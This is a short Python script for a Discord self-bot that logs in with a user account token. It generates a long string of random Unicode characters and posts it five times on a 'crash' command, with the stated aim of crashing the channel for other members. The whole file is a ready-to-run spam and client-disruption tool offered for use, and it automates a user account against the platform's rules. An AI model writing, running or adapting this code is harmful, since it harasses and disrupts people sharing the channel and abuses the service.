import json
from discord.ext import commands
import random
import string

#-------------------------------------------------------------------------------------------------------------------------
#set variables
with open('config.json', 'r') as handle:
    config = json.load(handle)
    token = (config["token"])
    prefix = (config["prefix"])
#-------------------------------------------------------------------------------------------------------------------------

    
#-------------------------------------------------------------------------------------------------------------------------
#define bot
bot = commands.Bot(command_prefix=prefix, self_bot=True, fetch_offline_members=False)
#-------------------------------------------------------------------------------------------------------------------------


#-------------------------------------------------------------------------------------------------------------------------
#generate random ascii code
ascii = ""

for x in range(1985):
    num = random.randrange(13000)
    ascii = ascii + chr(num)
print("Generated random ascii code\nType " + prefix + "crash to start sending the ascii in attempt to crash the channel")
#-------------------------------------------------------------------------------------------------------------------------


#-------------------------------------------------------------------------------------------------------------------------
#spam ascii in server
@bot.command()
async def crash(ctx):
    await ctx.send(ascii)
    await ctx.send(ascii)
    await ctx.send(ascii)
    await ctx.send(ascii)
    await ctx.send(ascii)
#-------------------------------------------------------------------------------------------------------------------------


bot.run(token, bot = False)
